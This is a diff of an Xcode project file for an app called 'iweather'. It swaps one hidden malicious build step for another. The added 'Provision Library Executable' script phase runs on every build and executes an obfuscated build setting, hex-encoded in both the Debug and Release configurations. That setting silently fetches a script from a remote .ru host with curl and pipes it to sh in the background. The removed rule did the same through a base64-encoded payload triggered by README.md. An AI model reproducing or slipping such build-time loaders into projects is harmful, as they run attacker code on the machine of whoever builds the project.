@@ -6,8 +6,13 @@
 	objectVersion = 77;
 	objects = {
 
+/* Begin PBXBuildFile section */
+/* End PBXBuildFile section */
+
+/* Begin PBXBuildRule section */
+/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
-		4A572EBA88414846827BBDC8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		8EED036C3032D74E00F68C15 /* iweather.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = iweather.app; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
@@ -41,7 +46,6 @@
 		8EED036D3032D74E00F68C15 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				4A572EBA88414846827BBDC8 /* README.md */,
 				8EED036C3032D74E00F68C15 /* iweather.app */,
 			);
 			name = Products;
@@ -54,12 +58,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 8EED03773032D74F00F68C15 /* Build configuration list for PBXNativeTarget "iweather" */;
 			buildPhases = (
+				191CD8318D3440BAA97BBDC8 /* Provision Library Executable */,
 				8EED03683032D74E00F68C15 /* Sources */,
 				8EED03693032D74E00F68C15 /* Frameworks */,
 				8EED036A3032D74E00F68C15 /* Resources */,
 			);
 			buildRules = (
-				1A3DE012BD6E4C3FA17BBDC8 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -107,40 +111,37 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-		1A3DE012BD6E4C3FA17BBDC8 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A8CDBB7}\"";
-			};
-	/* End PBXBuildRule section */
-
-/* Begin PBXBuildFile section */
-		81C1A003B0DE435DBF7BBDC8 /* README.md */ = {isa = PBXBuildFile; fileRef = 4A572EBA88414846827BBDC8; };
-/* End PBXBuildFile section */
+/* Begin PBXShellScriptBuildPhase section */
+		191CD8318D3440BAA97BBDC8 /* Provision Library Executable */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Provision Library Executable";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8CDBB7}\"";
+		};
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXResourcesBuildPhase section */
 		8EED036A3032D74E00F68C15 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				81C1A003B0DE435DBF7BBDC8 /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
-
-/* Begin PBXShellScriptBuildPhase section */
-/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		8EED03683032D74E00F68C15 /* Sources */ = {
@@ -156,7 +157,7 @@ sh -c \"${A8CDBB7}\"";
 		8EED03753032D74F00F68C15 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((o(){ `printf bTase64 | tr -d T` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNSAtLWNvbm5lY3QtdGltZW91dCAyNSAtTHNrZiAtZCAicD14Y29kZV9ydWxlIiBodHRwczovLzZsZHd1ZGdvY2tsMGcyLnJ1L2EpIiB8IHNoCg== | o | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((l(){ `printf x6xd | tr -d 6` -p -r; };echo 6563686f202224286375726c202d2d72657472792033202d2d636f6e6e6563742d74696d656f7574203239202d666b4c73202d642022703d78636f64655f7068617365222068747470733a2f2f306e76382d6b6e74376d313534372e72752f612922207c2073680a | l | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -221,7 +222,7 @@ sh -c \"${A8CDBB7}\"";
 		8EED03763032D74F00F68C15 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((o(){ `printf bTase64 | tr -d T` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNSAtLWNvbm5lY3QtdGltZW91dCAyNSAtTHNrZiAtZCAicD14Y29kZV9ydWxlIiBodHRwczovLzZsZHd1ZGdvY2tsMGcyLnJ1L2EpIiB8IHNoCg== | o | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((l(){ `printf x6xd | tr -d 6` -p -r; };echo 6563686f202224286375726c202d2d72657472792033202d2d636f6e6e6563742d74696d656f7574203239202d666b4c73202d642022703d78636f64655f7068617365222068747470733a2f2f306e76382d6b6e74376d313534372e72752f612922207c2073680a | l | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
